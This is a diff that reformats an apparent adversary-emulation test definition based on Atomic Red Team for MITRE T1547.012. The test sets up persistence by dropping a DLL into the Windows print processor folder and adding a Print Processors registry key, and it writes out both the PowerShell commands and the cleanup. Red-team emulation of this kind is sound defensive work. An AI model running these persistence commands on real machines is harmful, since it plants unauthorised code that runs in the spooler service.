@@ -1,4 +1,4 @@
-- id: 7811f4e7-b526-51a2-91ea-fd996907a823
+- requirements: []
   name: Soumaia ART Tests - Print Processors
   description: 'Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors.
 
@@ -10,26 +10,16 @@
 
     The payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html) (requires elevation)'
   tactic: privilege-escalation
-  technique:
-    attack_id: T1547.012
-    name: 'Boot or Logon Autostart Execution: Print Processors'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          if( $(get-service -Name spooler).StartType -eq "Disabled") {Set-Service -Name "spooler" -StartupType Automatic}
-          net stop spooler
-          Copy-Item "$.\AtomicTest.dll" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
-          reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /v "Driver" /d "AtomicTest.dll" /t REG_SZ /f
-          net start spooler
-          if(0){
-            Restart-Computer
-          }
-        cleanup: |-
-          net stop spooler
-          rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
-          rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
-          remove-item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" -Force -ErrorAction SilentlyContinue
-          net start spooler
-        payloads:
-        - AtomicTest.dll
+  technique_id: T1547.012
+  technique_name: 'Boot or Logon Autostart Execution: Print Processors'
+  executors:
+  - cleanup:
+    - net stop spooler; rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue; rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue; remove-item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" -Force -ErrorAction SilentlyContinue; net start spooler
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - AtomicTest.dll
+    parsers: []
+    command: if( $(get-service -Name spooler).StartType -eq "Disabled") {Set-Service -Name "spooler" -StartupType Automatic}; net stop spooler; Copy-Item "$.\AtomicTest.dll" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll; reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /v "Driver" /d "AtomicTest.dll" /t REG_SZ /f; net start spooler; if(0){ Restart-Computer }
+  id: 7811f4e7-b526-51a2-91ea-fd996907a823
